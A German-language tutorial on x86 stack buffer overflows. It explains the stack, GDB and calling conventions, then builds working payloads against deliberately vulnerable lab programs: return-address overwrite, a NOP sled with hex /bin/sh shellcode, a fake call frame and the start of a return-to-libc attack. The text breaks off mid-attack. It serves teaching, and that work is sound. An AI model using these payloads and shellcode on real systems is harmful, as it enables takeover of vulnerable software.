Memory corruptions (x86)

Voraussetzung:

- Grundlegendes Verständnis in C/ASM

1. Intro:
Als erstes müssen wir sämtliche Schutzmechanismen ausschalten, um unsere Angriffe durchzuführen.

Deaktiven von ASLR:
1. Deaktiviere temporär (Nach neustart wieder aktiv) ASLR  -> 
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

2. Kompiliert als x86 mit Symboltabellen und ohne Compiler-Sicherheitsprüfung:
gcc test.c -o vuln -g -m32 -fno-stack-protector -z execstack -no-pie


1. Speicherlayout Linux: 

---------------------- 0xffffffff (Hohe Speicheradresse)
| Umgebungsvariablen |
|--------------------|
|  |   Stack         |
|  V             ^   |
|      Heap      |   |
|--------------------|
|   Data (.bss)      |
|--------------------|
|   Data (.data)     |
|--------------------|
|   Text bzw. Code   |
---------------------- 0x00000000 (Niedrige Speicheradresse)

Der Stack wächst nach unten also in den niedrigen Speicherbereich und der Heap nach oben also in den hohen Speicherbereich.
Im .bss Segment befinden sich die nicht initialisierten Variablen z.B. int x;
Im .data Segement befinden sich die initialisierten Variablen z.B. int x = 5;
Im Text / Code Segment befinden sich die ASM-Instruktionen, dieser Bereich ist nur Lesbar.


2. Binary Code & GDB:
Wie sieht der C-Code kompiliert aus und was ist GDB?

Beispiel 1 -> test.c:
void foo(char *bar, int y)
{
   char buffer[20];
   int x = y;
}

int main(int argc, char *argv[])
{
  foo(argv[1],5);

  return 0;
}

Kompilieren:
gcc test.c -o vuln -g -m32 -fno-stack-protector -z execstack -no-pie

Unsere Binary heißt nun "vuln" nun schauen wir uns diese einmal im GNU-Debuggger (GDB) an.

Was ist GDB? 
Es ist das Standard-Debugging-Werkzeug unter Linux und hilft uns unser Programm zur Laufzeit zu betrachten.

Öffnen von vuln in GDB:
gdb --args vuln AAAAAAAAAA

In der Shell führen wir folgenden Befehl aus:

Bild 1:
(gdb) disassemble main
Dump of assembler code for function main:
   0x080483ea <+0>:     push   ebp
   0x080483eb <+1>:     mov    ebp,esp
   0x080483ed <+3>:     mov    eax,DWORD PTR [ebp+0xc]
   0x080483f0 <+6>:     add    eax,0x4
   0x080483f3 <+9>:     mov    eax,DWORD PTR [eax]
   0x080483f5 <+11>:    push   0x5
   0x080483f7 <+13>:    push   eax
   0x080483f8 <+14>:    call   0x80483db <foo>
   0x080483fd <+19>:    add    esp,0x8
   0x08048400 <+22>:    mov    eax,0x0
   0x08048405 <+27>:    leave  
   0x08048406 <+28>:    ret    
End of assembler dump.

Hier wird die Main-Funktion als ASM-Instruktionen im Text bzw. Code Segment angezeigt.

Eine Zeile ist folgendermaßen aufgebaut:

Adresse <offset>:   Instruktion Parameter 

Wir haben aber noch andere Funktionen in unserem Programm, die findet man mit:

(gdb) info functions
All defined functions:

File test.c:
void foo(char *, int);
int main(int, char **);

Non-debugging symbols:
0x0804828c  _init
0x080482c0  __libc_start_main@plt
0x080482e0  _start
0x08048310  __x86.get_pc_thunk.bx
0x08048320  deregister_tm_clones
0x08048350  register_tm_clones
0x08048390  __do_global_dtors_aux
0x080483b0  frame_dummy
0x08048410  __libc_csu_init
0x08048470  __libc_csu_fini
0x08048474  _fini

Für uns ist noch die Funktion foo() interessant, da diese im C-Code steht:

Bild 2:
(gdb) disassemble foo
Dump of assembler code for function foo:
   0x080483db <+0>:     push   ebp
   0x080483dc <+1>:     mov    ebp,esp
   0x080483de <+3>:     sub    esp,0x20
   0x080483e1 <+6>:     mov    eax,DWORD PTR [ebp+0xc]
   0x080483e4 <+9>:     mov    DWORD PTR [ebp-0x4],eax
   0x080483e7 <+12>:    nop
   0x080483e8 <+13>:    leave  
   0x080483e9 <+14>:    ret    
End of assembler dump.

Jetzt haben wir gesehen wie die main() / foo() Funktionen aussehen.

Als nächstes werden wir die Binary "ausführen", dafür setzen wir ein "Breakpoint" auf die main Funktion.
Wenn wir das Programm starten wollen, stoppt die Ausführung an der Stelle vom Breakpoint. 

(gdb) break main
Haltepunkt 1 at 0x80483ed

(gdb) run
Starting program: /home/vuln AAAAAAAAAA

Breakpoint 1, 0x080483ed in main ()

Als nächstes schauen wir uns einmal die Register an:

(gdb) info registers
eax            0xf7faedbc       -134550084
ecx            0xd1603a1f       -782222817
edx            0xffffcff4       -12300
ebx            0x0      0
esp            0xffffcfc8       0xffffcfc8
ebp            0xffffcfc8       0xffffcfc8
esi            0xf7fad000       -134557696
edi            0xf7fad000       -134557696
eip            0x80483ed        0x80483ed <main+3>
eflags         0x292    [ AF SF IF ]
cs             0x23     35
ss             0x2b     43
ds             0x2b     43
es             0x2b     43
fs             0x0      0
gs             0x63     99

Für unsere Betrachtungen sind die Register eip,esp,ebp relevant.

Was macht der eip? 
Der Befehlszähler (engl. instruction counter) – auch Programmzähler (wohl wörtlich entlehnt aus dem englischen program counter, kurz PC)[1] 
oder auch Programmschrittzähler genannt – ist ein spezielles Register innerhalb eines Hauptprozessors, das je nach Systemarchitektur 
die Speicheradresse des derzeitigen oder des nächsten auszuführenden Befehls enthält. Da dieser Zähler damit auf einen Speicherbereich zeigt, 
wird er auch als Befehlszeiger (englisch instruction pointer, kurz IP) oder Programmzeiger[1] bezeichnet.

Hier verweißt der eip auf: 0x80483ed <main+3>

(gdb) disassemble main
Dump of assembler code for function main:
   0x080483ea <+0>:     push   ebp
   0x080483eb <+1>:     mov    ebp,esp
=> 0x080483ed <+3>:     mov    eax,DWORD PTR [ebp+0xc]
   0x080483f0 <+6>:     add    eax,0x4
   0x080483f3 <+9>:     mov    eax,DWORD PTR [eax]
   0x080483f5 <+11>:    push   0x5
   0x080483f7 <+13>:    push   eax
   0x080483f8 <+14>:    call   0x80483db <foo>
   0x080483fd <+19>:    add    esp,0x8
   0x08048400 <+22>:    mov    eax,0x0
   0x08048405 <+27>:    leave  
   0x08048406 <+28>:    ret    
End of assembler dump.

Man betrachte den Pfeil, welcher auf folgende Zeile verweist:

=> 0x080483ed <+3>:     mov    eax,DWORD PTR [ebp+0xc]

Das wäre also die nächste Instruktion, welche in unserem Programm ausgeführt wird.

Was macht der esp?
Die Stapelregister (auch Stapelzeiger oder Stackpointer, aus englisch stack pointer, kurz SP) sind Adressregister zur Verwaltung von Stapelspeichern. 
Ein Stapelspeicher, auch Kellerspeicher oder nur Stack genannt, wird von einem Stapelregister nach dem LIFO-Prinzip (Last in, first out) organisiert und kann mit 
Push- oder Pop-Operationen gefüllt oder geleert werden. Dabei zeigt das Stackregister immer auf die Speicheradresse am Ende des Stacks, 
je nach Architektur auf oder zumeist hinter das letzte Element.

Was macht der ebp?
Der Base Pointer ist eine Konstante und zeigt immer auf den Anfang eines Stack Frames => dazu später mehr.

Quelle: https://de.wikipedia.org/wiki/Register_(Computer)

3. Der Funktionsaufruf einer Subroutine:

Als erstes müssen wir verstehen, was der Stack in der Speicherverwaltung für eine Rolle spielt!

Der Stack ist eine Datenstruktur im Speicher, welche Lokale Variablen und den "Kontrollfluss" der Funktionen in Stack Frames verwaltet.

Der Funktionsaufruf in Beispiel 1 besteht aus => foo(argv[1],5); 

Wie wird diese Funktion nun aufgerufen und was passiert mit den Stack?

Dieses Beispiel ist abhängig von den Aufrufkonvention => dazu später mehr.

1. PUSH die Parameter der aufgerufenen Funktion von rechts nach links auf den Stack (abhängig von Calling Convention, kommt später).
2. PUSH die Adresse der nächsten Instruktion nach foo(argv[1],5) auf den Stack => saved eip.

Sinngemäß:

push y;     => 5
push *bar   => *Adresse von argv[1];
push eip + 1;
call foo;

In ASM (Verweis auf Bild 1):

   0x080483f5 <+11>:    push   0x5      => Der Wert 5      
   0x080483f7 <+13>:    push   eax      => Register beinhaltet Adresse von argv[1];
   0x080483f8 <+14>:    call   0x80483db <foo>      => Bei der Call Instruktion wird automatisch eip+1 auf den Stack geelgt.

Der Stack würde danach wie folgt aussehen:

Bytes :  Kontrollfluss
        -------------
  1     | 5         | => Der Parameter y von foo() => hier würe im Stack der Wert 5 abgelegt werden.
        |-----------|
  4     | * bar     | => Ein Pointer der auf die Adresse der Parameter von foo() verweist.
        |-----------| 
  4     | eip + 1   | => Die Adresse der nächsten Instruktion, nach den ausgeführten call.
        -------------
        
3. Stackframes und Prolog/Epilog:


Wie sieht der Stack Frame für foo(argv[1],5) aus?
Nachdem foo(argv[1],5) aufgerufen wurde befinden wir uns nun in foo() hier müssen wir erstmal den Stack Frame aufbauen (Prolog):

Prolog: 

(gdb) disassemble foo
Dump of assembler code for function foo:
   0x080483db <+0>:     push   ebp      => Sichere den alten Base Pointer vom alten Frame (Main) auf den Stack.
   0x080483dc <+1>:     mov    ebp,esp  => Das aktuelle Ende des Stacks ist nun unser neuer Base Pointer (Anfang unseres Frames für foo()).
   0x080483de <+3>:     sub    esp,0x20 => Macht auf den Stack Platz für 20 Bytes.

Nun wurde unser Stack Frame aufgebaut und es befinden sich nun alle Informationen welche wir benötigen auf den Stack.

Stackframe foo() + Informationen zum Aufruf von foo()

Bytes : Kontrollfluss
        -------------
  1     | y         | => Der 2 Parameter y von foo() => mit den Wert 5 (s.o).
        |-----------|
  4     | * bar     | => Ein Pointer der auf die Adresse des 1 Parameter bar von foo() verweist.
        |-----------| 
  4     | saved eip | => Die Rücksprungsadresse die auf die Instruktionen nach foo(argv[1],5) verweist. 
        |-----------|
  4     | saved ebp | <-- ebp (Verweist auf den Anfang des Stack Frames) => Der alte Base Pointer, welcher auf den vorherigen Stack Frame (Main) verweist.
        |-----------|
  20    | buffer    | => Die lokale Variable -> Buffer => hier würde im Stack 20 "Zufällige" Werte stehen.
        |-----------|
  1     |   x       | <-- esp (Verweist auf das Ende des Stacks)  => Die lokale Variable -> x => hier würde im Stack der Wert 5 stehen.
        -------------
        
Nach den Prolog folgen weitere Instruktionen, welche den Ablauf der Funktion steuern => für unsere Betrachtung irrelevant.

Was passiert, wenn die Funktion ihre Aufgabe erledigt hat?

Der Kontrollfluss des Programms muss weiterlaufen, dafür müssen wir den nicht mehr gebrauchten Stack Frame abbauen.
Zusätzlich wird der alten Stack Frame von main() wiederhergestellt dieses geschieht im Epilog.

Epilog (Sinngemäß):
1. mov esp,ebp       => Setze den aktuellen Base Pointer auf den aktuellen Stack Pointer (Stack wird verkleinert)

Stackframe foo() + Informationen zum Aufruf von foo()

Bytes : Kontrollfluss
        -------------
  1     | y         | => Der 2 Parameter y von foo() => mit den Wert 5 (s.o).
        |-----------|
  4     | * bar     | => Ein Pointer der auf die Adresse des 1 Parameter bar von foo() verweist.
        |-----------| 
  4     | saved eip | => Die Rücksprungsadresse die auf die Instruktionen nach foo(argv[1],5) verweist. 
        |-----------|
  4     | saved ebp | <-- esp (Verweist auf das Ende des Stacks).
        -------------

2. pop ebp           => Stellt den alten Base Pointer wiederher, nimmt saved ebp vom Stack und legt ihn in das ebp Register.

Stackframe foo() + Informationen zum Aufruf von foo()

Bytes : Kontrollfluss
        -------------
  1     | y         | => Der 2 Parameter y von foo() => mit den Wert 5 (s.o).
        |-----------|
  4     | * bar     | => Ein Pointer der auf die Adresse des 1 Parameter bar von foo() verweist.
        |-----------| 
  4     | saved eip | <-- esp (Verweist auf das Ende des Stacks) => Die Rücksprungsadresse die auf die Instruktionen nach foo(argv[1],5) verweist. 
        -------------

3. ret               => Nimm den nächsten Wert vom Stack (saved eip) und springe zu der Instruktion (setze eip Register auf die Adresse von saved eip).

Stack nach Prolog:
Bytes : Kontrollfluss
        -------------
  1     | y         | => Der 2 Parameter y von foo() => mit den Wert 5 (s.o).
        |-----------|
  4     | * bar     | <-- esp  => Ein Pointer der auf die Adresse des 1 Parameter bar von foo() verweist.| 
        -------------

Die x86 Architektur verwendet folgende Befehle für den Epilog:

In ASM (Verweis auf Bild 2):
   0x080483e8 <+13>:    leave   => Diese Instruktion beinhaltet: "mov esp,ebp" und "pop ebp"
   0x080483e9 <+14>:    ret  

Nach den Ende des Epilog, befinden wir uns wieder im Stack Frame von main() und der eip zeigt auch die nächste Instruktion, nachdem foo(argv[1],5) ausgeführt wurde.

Es sind aber noch die Parameter von foo() auf den Stack, diese müssen nun entfernt werden.

Aufrufkonventionen (calling conventions):

Def Aufrufkonventionen:
Unter Aufrufkonvention versteht man die Methode, mit der in Computerprogrammen einem Unterprogramm Daten übergeben werden. 
In der Regel liegt es am Compiler, welche Konvention zum Einsatz kommt, so dass der Programmierer sich nicht damit beschäftigen muss. 
Bei der Entwicklung von Software in mehreren Sprachen ist es jedoch erforderlich, dass alle Module kompatible Aufrufkonventionen verwenden.

Quelle: https://de.wikipedia.org/wiki/Aufrufkonvention

Def Caller:
Der Caller ist derjenige der die Subroutine aufruft, also in unserem Fall die main() Funktion.

Def Callee:
Der Callee ist derjenige der aufgerufen wurde, also in unserem Fall die foo() Funktion.

Arten von Aufrufkonventionen:
Ich werde hier nur 3 von 4 Konvention vorstellen.

1. cdecl (Standart calling convention in C):
- Alle benötigten Parameter der Funktion werden auf den Stack gepusht.
- Der Caller löscht die Parameter vom Stack.
- Der Callee kann die eax,ecx,edx Register in seiner Routine benutzen.
- Der Callee speichert sein RÜckgabewert im eax Register.

Beispiel (Sinngemäß):

Caller:

push y;     => 5
push *bar   => *Adresse von argv[1];
push eip + 1;
call foo;
add esp, x  => "Verkleiner" den Stack um x Bytes <=> Caller löscht Parameter

In unseren Beispiel, wird die cdecl Kontvention verwendet, da der Caller (main()) die Parameter vom Stack entfernt:

in ASM (Verweis auf Bild 1):

   0x080483fd <+19>:    add    esp,0x8      => "Verkleiner" den Stack um x Bytes <=> Caller löscht Parameter

2. stdcall (Standart Calling Convention Win32 API):
- Alle benötigten Parameter der Funktion werden auf den Stack gepusht.
- Der Callee löscht die Parameter vom Stack.
- Der Callee kann die eax,ecx,edx Register in seiner Routine benutzen.
- Der Callee speichert sein RÜckgabewert im eax Register.

Beispiel (Sinngemäß): 

Caller:

push y;     => 5
push *bar   => *Adresse von argv[1];
push eip + 1;
call foo; 

Callee:
..... => Irgendwelche Instruktionen
ret x;  => "Verkleiner" den Stack um x Bytes <=> Callee löscht Parameter.


3. fastcall:
- Die ersten oder letzten 3 Parameter werden z.B. in eax,ecx,edx gespeichert, der Rest wird auf den Stack gespusht.
- Es ist implementierungsabhängig wer die Parameter vom Stack löscht.
- Der Callee speichert sein Rückgabewert im eax Register.

Nun haben wir ein grundlegendes Verständnis wie ein Programm arbeitet wenn es ausgeführt wird (Kontrollfluss).

4. Smashing the Stack for Lulz:

Beispiel 2 -> test1.c:

#include <string.h>
#include <stdio.h>

void lonely()
{
    puts("I'm not so lonely i think :) ");
}

void foo(char *bar)
{
   char buffer[20];
   strcpy(buffer,bar);
}

int main(int argc, char *argv[])
{
  foo(argv[1]);

  return 0;
}

Kompilieren:
gcc test1.c -o vuln1 -g -m32 -fno-stack-protector -z execstack -no-pie

In der Funktion foo() wird das gesamte "argv[1]" welches "beliebig" lang sein kann in die Variable "buffer" kopiert auch wenn wir nur 20 Bytes zur Verfügung haben, mithilfe
der Funktion strcpy().

Im klartext "strcpy()" doesn't give a fuck about our buffer! 
Außer es befindet sich in argv[1] ein "Nullbyte (%00 oder \x00) das makiert nämlich den Ende eines Strings und das "respektiert" strcpy().

Aber was passiert eigentlich wenn wir mehr in den Buffer packen wollen, als wir Platz haben?

Schauen wir uns mal den Stack Frame von foo() an, nachdem wir z.B. 40 mal ein 'A' übergeben.

Stackframe foo() + Informationen zum Aufruf von foo()

Bytes : Kontrollfluss

        -------------
  4     | A.......A | => Ein Pointer der auf die Adresse des 1 Parameter bar von foo() verweist.
        |-----------| 
  4     | A.......A | => Die Rücksprungsadresse die auf die Instruktionen nach foo(argv[1]) verweist. 
        |-----------|
  4     | A.......A | <-- ebp (Verweist auf den Anfang des Stack Frames) => Der alte Base Pointer, welcher auf den vorherigen Stack Frame (main) verweist.
        |-----------|
  20    | A.......A | <-- esp (Verweist auf den Ende des Stacks) => Die lokale Variable -> Buffer => hier würden eigentlich "maximal" 20 "Zufällige" Werte stehen.|
        -------------
        
Was passiert nun, wenn die Funktion foo() beendet wird, im Prolog?

Wie oben bereits erklärt, wird der Stack Frame abgebaut und würde vor "ret;" so aussehen:

Bytes : Kontrollfluss
        -------------
  4     | A.......A | => Ein Pointer der auf die Adresse des 1 Parameter bar von foo() verweist.
        |-----------|
  4     | A.......A | <-- esp (Verweist auf das neue Ende des Stacks) => Die Rücksprungsadresse (saved eip) die auf die Instruktionen nach foo(argv[1],5) verweist. 
        -------------

ret; => eip --> AAAA

AAAA ist aber keine gültige Instruktion, deswegen crasht das Programm <=> Segfault.

Wir können also den saved eip überschreiben und somit den Kontrollfluss des Programms manipulieren, also wäre der nächst logische Schritt ?

Korrekt wir lassen den eip nicht auf AAAA verweisen sondern auf eine gültige Instruktion z.B. auf den Anfang der Funktion lonely().
Dafür müssen wir nätürlich den saved eip mit einer gültigen Adresse bzw. Instruktion überschreiben.

Kontrolle über den Kontrollfluss:

1. Fülle den Stack mithilfe von buffer bis zum "saved eip" mit Müll z.B. (A).

Wieviel A's brauchen wir in der Theorie?
20 A's (buffer) + 4 A's (saved ebp) = 24 A's

In der Praxis brauchen wir (Wegen Alignment im Speicher oder weil der Compiler magische Sachen macht):
24 A's + 8 A's = 32 A's

2. Suche Adresse von lonely() in gdb:
gdb --args vuln1 AAAAAAAAAA

(gdb) break main
(gdb) run
(gdb) p lonely 

Output:
$1 = {void ()} 0x804843b <lonely>

Die Adresse von lonely() innerhalb des Code Segments ist also: 0x804843b

Nun konstruieren wir den Payload, also 32 A's + Adresse von lonely().

Adressierung im Speicher:
Im Speicher werden die Werte im "Big Endian" Format gespeichert => 0x804843b
Wenn wir diese Adresse auf den Stack pushen wollen, müssen wir die Adresse in "Little Endian" übergeben, warum?
Wenn wir in ASM eine Load Instruktion verwenden, wird die Adresse umgedreht also von Little Endian zu Big Endian und liegt somit korrekt im Speicher.

0x804843b = 0x08 04 84 3b => 0x3b 83 04 08 

3. Run Payload:
Wir verwenden Python um unseren Payload an die Binary zu übergeben:

gdb --args vuln1 $(python -c "print 'A'*32 + '\x3b\x84\x04\x08'")

(gdb) run

Wir erhalten folgende Ausgabe:

I'm not so lonely i think :) 

Program received signal SIGSEGV, Segmentation fault.
0xffffd100 in ?? ()

=> Nun haben wir erfolgreich den Kontrollfluss des Programms manipuliert, indem wir den "saved eip" mit einer gültigen Adresse überschrieben haben.

Natürlich "segfaulted" das Programm hier, da wir den kompletten Stack durcheinander gebracht haben.

Aufgabe für dich:
Wie sieht der Stackframe von foo() aus, nachdem strcpy() ausgeführt wurde?

Wir haben nun verstanden, wie man den Kontrollfluss manipuliert, aber was jetzt?

Einfach nur Funktionen aufzurufen reicht in der Regel nicht um damit z.B. ein System zu übernehmen.
Was wäre wenn wir einfach eigenen "Code" bzw. Instruktionen einschleusen und den "saved eip" auf den Anfang der eingeschleusten Instruktionen setzen? => Shellcode

Code Injection (Shellcode):

Def Shellcode:
Shellcode ist ein Begriff aus der Software-Programmierung und bezeichnet die in Opcodes umgewandelte Form von Assemblersprachenbefehlen, die einen oder mehrere bestimmte Befehle ausführen soll. In der Regel wird eine Shell gestartet, daher auch der Name. Shellcodes werden in Pufferüberlauf- und anderen Dateninjektions-Attacken benutzt.

Quelle: https://de.wikipedia.org/wiki/Shellcode

Beispiel: Shellcode (24 Bytes) => Execute /bin/sh (ASM Instruktionen): 
=================SHELLCODE(INTEL FORMAT)=================
 
section .text
global _start
_start:
xor eax,eax
cdq
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx,esp
push eax
push ebx
mov ecx, esp
mov al,0x0b
int 80h
 
===================END HERE============================

In Hex:
'\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'

Quelle:
https://www.exploit-db.com/exploits/42428/

Wichtig:
- Der Shellcode darf kein "0 Byte" enthalten => \x00 (Hex), da strcpy() sonst abbrechen würde und der Shellcode nicht auf den Stack kommt.
- Am Ende jedes Shellcode's wird die Instruktion "0x80" ausgeführt, das ist ein Opcode der den Interrupt Handler aufruft, damit unser Shellcode an den Syscall übergeben wird.

Konstruiere Payload:
Da sich unser Programm nicht verändert hat, können wir den alten Payload verwenden:

gdb --args vuln1 $(python -c "print 'A'*32 + 'BBBB' + '\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'")

Das Problem ist, das wir nun den "saved eip" hier BBBB auf den Anfang von den Shellcode gesetzt werden muss um diesen auszuführen.

Es wäre jetzt möglich, einfach die Adresse von dem Shellcode zu suchen und anzugeben, jedoch kann das Stack Layout leicht variieren von Ausführung zu Ausführung.

=> Den Shellcode genau zu treffen ist schwer, was machen wir?

Ganz einfach, wir bauen uns eine große "Landebahn (Nopsled)" die uns zu unseren Shellcode bringt, dafür verwenden wir "NOP's".

Ein NOP in Hex 0x90 steht für "No Operation", es passiert also nichts und der eip wird einfach auf die nächste Instruktion gesetzt.
Logischerweise packen wir den Nopsled vor den Shellcode und springen ungefähr in die Mitte vom Nopsled, was uns zu unseren Shellcode führt.

Hier verwenden wir 100x Nops.

Adresse von der Mitte des Nopsled: 0xffffcec0 => In Little Endian => '\xc0\xce\xff\xff'

Payload:
gdb --args vuln1 $(python -c "print 'A'*32 + '\xc0\xce\xff\xff' + '\x90'*100 + '\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'")

(gdb) run

----------> Dropped Shell:
process 4704 is executing new program: /bin/sh
$uname -a 
Linux dontknowme 4.4.0-93-generic #116-Ubuntu SMP Fri Aug 11 21:17:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux

Stackframe foo() nach strcpy():

Bytes : Kontrollfluss
        -------------
  24    | Shellcode | => Der Shellcode welcher am Ende ausgeführt wird, nachdem der Nopsled durchlaufen wurde.
        |-----------|
  100   |0x90..0x90 | => NOPsled
        |-----------| 
  4     |0xffffcec0 | => Die Rücksprungsadresse die nun auf den Nopsled verweist.
        |-----------|
  4     |   AAAA    | <-- ebp (Verweist auf den Anfang des Stack Frames) => Der alte Base Pointer, welcher auf den vorherigen Stack Frame (main) verweist.
        |-----------|
  20    | A.......A | <-- esp (Verweist auf den Ende des Stacks)   => buffer 
        -------------

Fazit:
Wir können also beliebigen Code ausführen in einen Programm welches Verwundbar ist gegenüber "Buffer Overflows".

5. Advanced Smashing for lulz again:

Es wäre zu schön wenn solche Angriffe heute noch funktionieren würden, leider gibt es ein paar Schutzmechanismen um die Ausnutzung der Lücke zu erschweren:

Ein Beispiel wäre DEP (Data Execution Prevention) das dafür sorgt, das unser Programm direkt crasht wenn wir versuchen den "saved eip" auf eine Adresse 
in unseren Stack zeigen zu lassen. 

DEP sorgt dafür, das der gesamte Stack also auch seine Frames, nur "Writable" sind und nicht "Executable".

Ein Shellcode auf den Stack zu bringen klappt noch, bringt aber herzlich wenig, wenn wir den eip nicht mehr auf den Shellcode setzten können um ihn auszuführen.

Aber wir können immer noch den Kontrollfluss manipulieren also den saved eip überschreiben!

Glücklicherweise gibt es hier ein paar Leute die sich das nicht gefallen lassen und sagen:

DEP ? Oh wait hold my beer => 5 minutes later => Return-to-libc Attack (ret2libc) => Dazu später mehr.

5.1 Code Reuse Angriff:

Anstatt eigenen Code zu injecten und diesen auszuführen (was ja nicht mehr klappt dank DEP) schauen wir einfach welchen Code wir eigentlich noch so im im Text-Segment haben und
springen dahin => Code reuse.
Dieser Code muss immer ausführbar sein, da dort alle Instruktionen liegen.

Wie funktioniert der Angriff?
Ganz einfach wir schieben einfach ein "Fake Calling" Frame auf den Stack und das Programm denkt, das diese Funktion aufgerufen werden soll.

Beispiel 3 -> test2.c:

#include <string.h>
#include <stdio.h>

void add(int a, int b)
{
    printf("Ergebnis: %d = %d + %d\n",(a+b),a,b);
}

void foo(char *bar)
{
   char buffer[20];
   strcpy(buffer,bar);
}

int main(int argc, char *argv[])
{
  foo(argv[1]);

  return 0;
}

Wir versuchen jetzt mal ein "Code reuse" Angriff, die Funktion add(a,b) wird niemals aufgerufen, das ändern wir.

Fake Calling Frame:
Wir würde z.B. ein Funktionsaufruf von add(286331153,572662306) aussehen?

Sinngemäß:
push 572662306;     => push b
push 286331153;     => push a
call add;           => Adresse von add(a,b) + saved eip (verweist auf die Instruktion nach add).


Wie würde also unser Stack Frame von foo aussehen?

Stackframe foo() + Informationen zum Aufruf von foo()

Bytes : Kontrollfluss

        -------------
  4     | b         | => Der Parameter b von add => Hier würde der Wert 572662306 stehen.    | => Fake calling Frame Teil 1
        |-----------|
  4     | a         | => Der Parameter a von add => Hier würde der Wert 286331153 stehen.    | => Fake calling Frame Teil 2
        |-----------|
  4     |   ret     | => Der "saved eip" der nach add ausgeführt wird.                       | => Fake calling Frame Teil 3
        |-----------| 
  4     | *add      | => Die Rücksprungsadresse von foo(argv[1]) verweist nun auf add
        |-----------|
  4     | saved ebp | <-- ebp (Verweist auf den Anfang des Stack Frames) => Der alte Base Pointer, welcher auf den vorherigen Stack Frame (main) verweist.
        |-----------|
  20    | buffer    | <-- esp (Verweist auf den Ende des Stacks) => Die lokale Variable -> Buffer => hier würden eigentlich "maximal" 20 "Zufällige" Werte stehen.|
        -------------

Kompilieren (Ohne "-z execstack" => Nun ist DEP aktiviert):
gcc test2.c -o vuln3 -g -m32 -fno-stack-protector -no-pie

Da sich an unserer angreifbaren Funtkion foo() nichts geändert hat, können wir wie vorher auch unseren Payload verwenden.

Konstruiere Payload:
1  Overflow Buffer mit 32 A's
2. Parameter b = 572662306 in Hex 0x22222222 bzw. '\x22\x22\x22\x22'
3. Parameter a = 286331153 in Hex 0x11111111 bzw. '\x11\x11\x11\x11'

4. Suche Adresse von add():
- gdb --args vuln AAAA

(gdb) break main
Haltepunkt 1 at 0x804848e: file test3.c, line 17.
(gdb) p add
$1 = {void (int, int)} 0x804843b <add>

=> 0x804843b in Little Endian = 0x3b840408 bzw. '\x3b\x84\x04\x08'

5. Beliebige ret Adresse => Hier "BBBB"

Payload => gdb --args vuln2 $(python -c "print 'A'*32 + '\x3b\x84\x04\x08' + 'BBBB' '\x11\x11\x11\x11' + '\x22\x22\x22\x22'")

Starte Payload:
(gdb) run
Starting program: /home/vuln2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\;BBBB\"\"\"\"
Ergebnis: 858993459 = 286331153 + 572662306

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()

Fazit:
Wie haben eine Funktion ausgeführt, welche nie aufgerufen wurde und konnten ebenfalls Parameter übergeben.
Da wir einfach beliebige Fake Frames auf den Stack schieben können und Kontrolle über den Kontrollfluss des Programms haben.
Es gibt jedoch noch viel mächtigere Werkzeuge bzgl. Code Reuse, nämlich die libC, wonach auch sein Angriff benannt wurde.

5.2 Return-to-libc Angriff:

Warum libc?
Das ist die Standard Libary für C welche alle wichtige Funktionen enthält, diese wird vom Compiler automatisch zur Binary gelinkt.
Wenn wir diese Binary nun ausführen, wird automatisch die libc mit in den Speicher bzw. ins Text/Code Segment geladen.

Wir können also Code nutzen welcher nicht im Stack liegt (DEP Bypass), aber was bringt uns das?
Nun in der libc befinden sich auch nützliche Funktionen wie z.B. system(), womit wir auch eine Shell droppen können (ähnlich wie beim Shellcode).

Wie funktioniert der Angriff?
Wir erstellen einfach einfach ein Fake Calling Frame für z.B. system() und droppen eine Shell.

Konstruiere Payload (bzgl. Beispiel 3):

1. Suche Adresse von system() in libC
gdb --args vuln2 AAAAAAAAAA
(gdb) break main
Haltepunkt 1 at 0x804848e: file test3.c, line 17.
(gdb) run
Starting program: /home/vuln2 AAAAAAAAAA

Breakpoint 1, main (argc=2, argv=0xffffcff4) at test3.c:17
17        foo(argv[1]);
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e35da0 <system>

2. Suche Parameter von system() z.B. "/bin/sh":
Hier gibt es verschiedene Möglichkeiten, man kann z.B. den String /bin/sh auf den Stack pushen und 
die Adresse suchen. Wie wir wissen, weichen die Adresse im Stack von Aufruf zu Auruf ab, deswegen nutzen wir eine bessere Methode.

Wie durchsuchen einfach libC nach /bin/sh und schauen ob wir eine gültige Adresse für diesen String finden.

(gdb) info proc map
process 5938
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/vuln2
         0x8049000  0x804a000     0x1000        0x0 /home/vuln2
         0x804a000  0x804b000     0x1000     0x1000 /home/vuln2
        0xf7dfb000 0xf7fab000   0x1b0000        0x0 /lib/i386-linux-gnu/libc-2.23.so       <------- LibC
        0xf7fab000 0xf7fad000     0x2000   0x1af000 /lib/i386-linux-gnu/libc-2.23.so
        0xf7fad000 0xf7fae000     0x1000   0x1b1000 /lib/i386-linux-gnu/libc-2.23.so
        0xf7fae000 0xf7fb1000     0x3000        0x0 
        0xf7fd4000 0xf7fd6000     0x2000        0x0 
        0xf7fd6000 0xf7fd8000     0x2000        0x0 [vvar]
        0xf7fd8000 0xf7fd9000     0x1000        0x0 [vdso]
        0xf7fd9000 0xf7ffb000    0x22000        0x0 /lib/i386-linux-gnu/ld-2.23.so
        0xf7ffb000 0xf7ffc000     0x1000        0x0 
        0xf7ffc000 0xf7ffd000     0x1000    0x22000 /lib/i386-linux-gnu/ld-2.23.so
        0xf7ffd000 0xf7ffe000     0x1000    0x23000 /lib/i386-linux-gnu/ld-2.23.so
        0xfffdd000 0xffffe000    0x21000        0x0 [stack]


(gdb) find 0xf7dfb000, +9999999, "/bin/sh"
0xf7f569ab
warning: Unable to access 16000 bytes of target memory at 0xf7fb0733, halting search.
1 pattern found.
(gdb) x/s 0xf7f569ab               => Untersuche die gefundene Adresse.
0xf7f569ab:     "/bin/sh"

